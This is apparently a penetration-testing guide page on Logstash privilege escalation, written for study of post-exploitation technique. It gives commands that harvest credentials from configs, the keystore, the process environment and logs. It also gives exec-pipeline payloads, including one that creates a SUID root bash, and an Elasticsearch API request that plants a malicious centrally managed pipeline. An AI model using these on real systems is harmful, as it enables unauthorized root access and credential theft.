_body: "# Logstash Privilege Escalation\n\n{{#include ../../banners/hacktricks-training.md}}\n\n## Logstash\n\nLogstash is\
  \ used to **gather, transform, and dispatch logs** through a system known as **pipelines**. These pipelines are made up\
  \ of **input**, **filter**, and **output** stages. An interesting aspect arises when Logstash operates on a compromised\
  \ machine.\n\n### Pipeline Configuration\n\nPipelines are configured in the file **/etc/logstash/pipelines.yml**, which\
  \ lists the locations of the pipeline configurations:\n\n```yaml\n# Define your pipelines here. Multiple pipelines can be\
  \ defined.\n# For details on multiple pipelines, refer to the documentation:\n# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html\n\
  \n- pipeline.id: main\n  path.config: \"/etc/logstash/conf.d/*.conf\"\n- pipeline.id: example\n  path.config: \"/usr/share/logstash/pipeline/1*.conf\"\
  \n  pipeline.workers: 6\n```\n\nThis file reveals where the **.conf** files, containing pipeline configurations, are located.\
  \ When employing an **Elasticsearch output module**, it's common for **pipelines** to include **Elasticsearch credentials**,\
  \ which often possess extensive privileges due to Logstash's need to write data to Elasticsearch. Wildcards in configuration\
  \ paths allow Logstash to execute all matching pipelines in the designated directory.\n\nIf Logstash is started with `-f\
  \ <directory>` instead of `pipelines.yml`, **all files inside that directory are concatenated in lexicographical order and\
  \ parsed as a single config**. This creates 2 offensive implications:\n\n- A dropped file like `000-input.conf` or `zzz-output.conf`\
  \ can change how the final pipeline is assembled\n- A malformed file can prevent the whole pipeline from loading, so validate\
  \ payloads carefully before relying on auto-reload\n\n### Fast Enumeration on a Compromised Host\n\nOn a box where Logstash\
  \ is installed, quickly inspect:\n\n```bash\nps aux | grep -i logstash\nsystemctl cat logstash 2>/dev/null\ncat /etc/logstash/pipelines.yml\
  \ 2>/dev/null\ncat /etc/logstash/logstash.yml 2>/dev/null\nfind /etc/logstash /usr/share/logstash -maxdepth 3 -type f \\\
  ( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \\) -ls\nrg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\\\
  s*=>|hosts\\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null\n```\n\nAlso check whether the local monitoring API is reachable.\
  \ By default it binds on **127.0.0.1:9600**, which is usually enough after landing on the host:\n\n```bash\ncurl -s http://127.0.0.1:9600/?pretty\n\
  curl -s http://127.0.0.1:9600/_node/pipelines?pretty\ncurl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty\n```\n\n\
  This usually gives you pipeline IDs, runtime details, and confirmation that your modified pipeline has been loaded.\n\n\
  Credentials recovered from Logstash commonly unlock **Elasticsearch**, so check [this other page about Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).\n\
  \n### Privilege Escalation via Writable Pipelines\n\nTo attempt privilege escalation, first identify the user under which\
  \ the Logstash service is running, typically the **logstash** user. Ensure you meet **one** of these criteria:\n\n- Possess\
  \ **write access** to a pipeline **.conf** file **or**\n- The **/etc/logstash/pipelines.yml** file uses a wildcard, and\
  \ you can write to the target folder\n\nAdditionally, **one** of these conditions must be fulfilled:\n\n- Capability to\
  \ restart the Logstash service **or**\n- The **/etc/logstash/logstash.yml** file has **config.reload.automatic: true** set\n\
  \nGiven a wildcard in the configuration, creating a file that matches this wildcard allows for command execution. For instance:\n\
  \n```bash\ninput {\n  exec {\n    command => \"whoami\"\n    interval => 120\n  }\n}\n\noutput {\n  file {\n    path =>\
  \ \"/tmp/output.log\"\n    codec => rubydebug\n  }\n}\n```\n\nHere, **interval** determines the execution frequency in seconds.\
  \ In the given example, the **whoami** command runs every 120 seconds, with its output directed to **/tmp/output.log**.\n\
  \nWith **config.reload.automatic: true** in **/etc/logstash/logstash.yml**, Logstash will automatically detect and apply\
  \ new or modified pipeline configurations without needing a restart. If there's no wildcard, modifications can still be\
  \ made to existing configurations, but caution is advised to avoid disruptions.\n\n### More Reliable Pipeline Payloads\n\
  \nThe `exec` input plugin still works in current releases and requires either an `interval` or a `schedule`. It executes\
  \ by **forking** the Logstash JVM, so if memory is tight your payload may fail with `ENOMEM` instead of silently running.\n\
  \nA more practical privilege-escalation payload is usually one that leaves a durable artifact:\n\n```bash\ninput {\n  exec\
  \ {\n    command => \"cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot\"\n    interval\
  \ => 300\n  }\n}\noutput {\n  null {}\n}\n```\n\nIf you don't have restart rights but can signal the process, Logstash also\
  \ supports a **SIGHUP**-triggered reload on Unix-like systems:\n\n```bash\nkill -SIGHUP $(pgrep -f logstash)\n```\n\nBe\
  \ aware that not every plugin is reload-friendly. For example, the **stdin** input prevents automatic reload, so don't assume\
  \ `config.reload.automatic` will always pick up your changes.\n\n### Stealing Secrets from Logstash\n\nBefore focusing only\
  \ on code execution, harvest the data Logstash already has access to:\n\n- Plaintext credentials are often hardcoded inside\
  \ `elasticsearch {}` outputs, `http_poller`, JDBC inputs, or cloud-related settings\n- Secure settings may live in **`/etc/logstash/logstash.keystore`**\
  \ or another `path.settings` directory\n- The keystore password is frequently supplied through **`LOGSTASH_KEYSTORE_PASS`**,\
  \ and package-based installs commonly source it from **`/etc/sysconfig/logstash`**\n- Environment-variable expansion with\
  \ `${VAR}` is resolved at Logstash startup, so the service environment is worth inspecting\n\nUseful checks:\n\n```bash\n\
  ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null\nstrings /etc/logstash/conf.d/*.conf 2>/dev/null | head\n\
  tr '\\0' '\\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort\ncat /etc/sysconfig/logstash 2>/dev/null\njournalctl\
  \ -u logstash --no-pager 2>/dev/null | tail -n 200\nls -lah /var/log/logstash 2>/dev/null\n```\n\nThis is also worth checking\
  \ because **CVE-2023-46672** showed that Logstash could record sensitive information in logs under specific circumstances.\
  \ On a post-exploitation host, old Logstash logs and `journald` entries may therefore disclose credentials even if the current\
  \ config references the keystore instead of storing secrets inline.\n\n### Centralized Pipeline Management Abuse\n\nIn some\
  \ environments, the host does **not** rely on local `.conf` files at all. If **`xpack.management.enabled: true`** is configured,\
  \ Logstash can pull centrally managed pipelines from Elasticsearch/Kibana, and after enabling this mode local pipeline configs\
  \ are no longer the source of truth.\n\nThat means a different attack path:\n\n1. Recover Elastic credentials from local\
  \ Logstash settings, the keystore, or logs\n2. Verify whether the account has the **`manage_logstash_pipelines`** cluster\
  \ privilege\n3. Create or replace a centrally managed pipeline so the Logstash host executes your payload on its next poll\
  \ interval\n\nThe Elasticsearch API used for this feature is:\n\n```bash\ncurl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned\
  \ \\\n  -H 'Content-Type: application/json' \\\n  -u user:password \\\n  -d '{\n    \"description\": \"malicious pipeline\"\
  ,\n    \"pipeline\": \"input { exec { command => \\\"id > /tmp/.ls-rce\\\" interval => 120 } } output { null {} }\",\n \
  \   \"pipeline_metadata\": {\"type\": \"logstash_pipeline\", \"version\": \"1\"},\n    \"pipeline_settings\": {\"pipeline.workers\"\
  : 1, \"pipeline.batch.size\": 1}\n  }'\n```\n\nThis is especially useful when local files are read-only but Logstash is\
  \ already registered to fetch pipelines remotely.\n\n## References\n\n- [Elastic Docs: Reloading the Config File](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)\n\
